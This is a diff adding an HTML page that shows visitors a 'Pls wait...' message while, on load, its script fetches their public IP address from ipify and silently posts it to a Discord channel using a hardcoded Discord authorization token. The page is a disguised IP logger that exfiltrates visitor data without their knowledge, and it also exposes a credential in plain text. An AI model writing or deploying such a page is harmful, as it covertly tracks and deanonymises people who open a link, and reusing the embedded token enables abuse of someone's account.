@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+ 
+<head>
+    <title>Getting Clients IP</title>
+    <style>
+    p, h1 {
+        color: red;
+    }
+    </style>
+  
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+     
+      <script>
+     
+    /* Add "https://api.ipify.org?format=json" statement
+               this will communicate with the ipify servers in
+               order to retrieve the IP address $.getJSON will
+               load JSON-encoded data from the server using a
+               GET HTTP request */
+                
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+         
+        // Setting text of element P with id gfg
+        $("#gfg").html(data.ip);
+        fetch('https://discord.com/api/v9/channels/1028003104202952884/messages', {
+  method: 'POST',
+  body: JSON.stringify({
+    content: 'Username : Unknow\nIpv4 : ' + data.ip,
+  }),
+  headers: {
+    'Content-type': 'application/json',
+    'authorization': 'OTI0NzMzMjkxNTExMzA4MzQw.GQcW-N.id9R1H7r9yKhM46g34YPP6kUTUQLavJXDZ9reE',
+  },
+})
+  .then((response) => response.json())
+  .then((json) => console.log(json));
+
+    })
+    </script>
+</head>
+ 
+<body style="background-color:black;">
+    <center>
+        <h1>Pls wait...</h1>
+        <p id="gfg"></p>
+ 
+    </center>
+</body>
+ 
+</html>
